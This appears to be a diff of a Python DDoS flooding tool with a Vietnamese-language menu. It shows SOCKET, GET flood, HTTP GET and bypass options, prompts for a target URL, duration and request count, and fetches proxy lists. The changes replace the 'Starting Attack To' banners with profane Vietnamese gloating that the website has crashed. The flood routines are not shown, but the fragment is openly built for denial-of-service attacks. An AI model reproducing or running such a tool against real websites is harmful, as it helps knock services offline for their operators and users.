@@ -57,10 +57,9 @@ ________________________________________________________🤍
 _______________________________________________________] 🫶 atu cutis1tg <3
                          © Developer: Nguyễn Anh Tú ?
 
-🌉🎆🌇🌌🌠
 		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" SOCKET")
 		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" GET FLOOD")
-		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" HTTP GET") Đấm Web
+		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" HTTP GET")
 		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" BYPASS")
 		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" THOÁT")
 		print("\n")
@@ -74,9 +73,9 @@ _______________________________________________________] 🫶 atu cutis1tg <3
 					floodtime = int(input(f"{Color.LG} cc Time: "+Color.RESET))
 					reqs = int(input(f"{Color.LG} cc Reqs: "+Color.RESET))
 					for i in range(200):
-						print (f"{Color.LG}Starting Attack To ➠ {Color.LG}" + url)
-						print (f"{Color.LR}Starting Attack To ➠ {Color.LR}" + url)
-						print (f"{Color.LY}Starting Attack To ➠ {Color.LY}" + url)
+						print (f"{Color.LG}Sập Web Cặc Rồi Hahaaa ➠ {Color.LG}" + url)
+						print (f"{Color.LR}Sập Web Cặc Rồi Hahaaa ➠ {Color.LR}" + url)
+						print (f"{Color.LY}Sập Web Cặc Rồi Hahaaa ➠ {Color.LY}" + url)
 						time.sleep(0.01)
 					with open("nat/http.txt", 'w') as p:
 						p.write(httpx.get(http_proxy).text)
@@ -85,12 +84,12 @@ _______________________________________________________] 🫶 atu cutis1tg <3
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option == '02' or option == '2':
 				try:
-					url = str(input(f"{Color.LG} :> URL: "+Color.RESET))
-					floodtime = int(input(f"{Color.LG} :> Time: "+Color.RESET))
+					url = str(input(f"{Color.LG} :( URL: "+Color.RESET))
+					floodtime = int(input(f"{Color.LG} :( Time: "+Color.RESET))
 					for i in range(200):
-						print (f"{Color.LG}Starting Attack To ➠ {Color.LG}" + url)
-						print (f"{Color.LR}Starting Attack To ➠ {Color.LR}" + url)
-						print (f"{Color.LY}Starting Attack To ➠ {Color.LY}" + url)
+						print (f"{Color.LG}Sập Web Cặc Rồi Hahaaa ➠ {Color.LG}" + url)
+						print (f"{Color.LR}Sập Web Cặc Rồi Hahaaa ➠ {Color.LR}" + url)
+						print (f"{Color.LY}Sập Web Cặc Rồi Hahaaa ➠ {Color.LY}" + url)
 						time.sleep(0.01)
 					with open("nat/http.txt", 'w') as p:
 						p.write(httpx.get(http_proxy).text)
@@ -99,12 +98,12 @@ _______________________________________________________] 🫶 atu cutis1tg <3
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option == '03' or option == '3':
 				try:
-					url = str(input(f"{Color.LG} :> URL: "+Color.RESET))
-					floodtime = int(input(f"{Color.LG} :> Time: "+Color.RESET))
+					url = str(input(f"{Color.LG} :( URL: "+Color.RESET))
+					floodtime = int(input(f"{Color.LG} :( Time: "+Color.RESET))
 					for i in range(200):
-						print (f"{Color.LG}Starting Attack To ➠ {Color.LG}" + url)
-						print (f"{Color.LR}Starting Attack To ➠ {Color.LR}" + url)
-						print (f"{Color.LY}Starting Attack To ➠ {Color.LY}" + url)
+						print (f"{Color.LG}Sập Web Cặc Rồi Hahaaa ➠ {Color.LG}" + url)
+						print (f"{Color.LR}Sập Web Cặc Rồi Hahaaa ➠ {Color.LR}" + url)
+						print (f"{Color.LY}Sập Web Cặc Rồi Hahaaa ➠ {Color.LY}" + url)
 						time.sleep(0.01)
 					with open("nat/http.txt", 'w') as p:
 						p.write(httpx.get(http_proxy).text)
@@ -113,12 +112,12 @@ _______________________________________________________] 🫶 atu cutis1tg <3
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option == '04' or option == '4':
 				try:
-					url = str(input(f"{Color.LG} :> URL: "+Color.RESET))
-					floodtime = int(input(f"{Color.LG} :> Time: "+Color.RESET))
+					url = str(input(f"{Color.LG} :( URL: "+Color.RESET))
+					floodtime = int(input(f"{Color.LG} :( Time: "+Color.RESET))
 					for i in range(200):
-						print (f"{Color.LG}Starting Attack To ➠ {Color.LG}" + url)
-						print (f"{Color.LR}Starting Attack To ➠ {Color.LR}" + url)
-						print (f"{Color.LY}Starting Attack To ➠ {Color.LY}" + url)
+						print (f"{Color.LG}Sập Web Cặc Rồi Hahaaa ➠ {Color.LG}" + url)
+						print (f"{Color.LR}Sập Web Cặc Rồi Hahaaa ➠ {Color.LR}" + url)
+						print (f"{Color.LY}Sập Web Cặc Rồi Hahaaa ➠ {Color.LY}" + url)
 						time.sleep(0.01)
 					with open("nat/http.txt", 'w') as p:
 						p.write(httpx.get(http_proxy).text)
